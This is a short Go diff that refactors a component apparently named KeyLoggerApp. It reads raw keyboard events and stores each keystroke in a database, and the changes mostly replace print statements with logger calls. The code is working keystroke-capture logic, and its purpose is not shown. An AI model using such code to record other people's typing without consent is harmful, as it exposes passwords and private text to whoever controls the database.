@@ -18,20 +18,25 @@ func (c *KeyLoggerApp) Start(wg *sync.WaitGroup) {
 		fmt.Println("No keyboard found...you will need to provide manual input path")
 		return
 	}
-	fmt.Println("Found a keyboard at", keyboard)
-	klgr, err := keylogger.New(keyboard)
+	lgr.Debug("Found keyboard at path: ", keyboard)
+	keyLogger, err := keylogger.New(keyboard)
 	if err != nil {
-		fmt.Printf("Error: %v", err)
+		lgr.Error("Error creating keylogger instance: ", err)
 		return
 	}
-	defer klgr.Close()
+	defer func(keyLogger *keylogger.KeyLogger) {
+		err := keyLogger.Close()
+		if err != nil {
+			lgr.Error("Error closing keylogger")
+		}
+	}(keyLogger)
 	for stopKeyloggerApp != true {
-		events := klgr.Read()
+		events := keyLogger.Read()
 		for e := range events {
 			if e.Type == keylogger.EvKey {
 				err = db.WriteDataRow("", db.KeylogsDataType, []byte(e.KeyString())) // replace reqId
 				if err != nil {
-					fmt.Printf("error: %v", err)
+					lgr.Error("Error writing keylogger data: ", err)
 				}
 			}
 		}
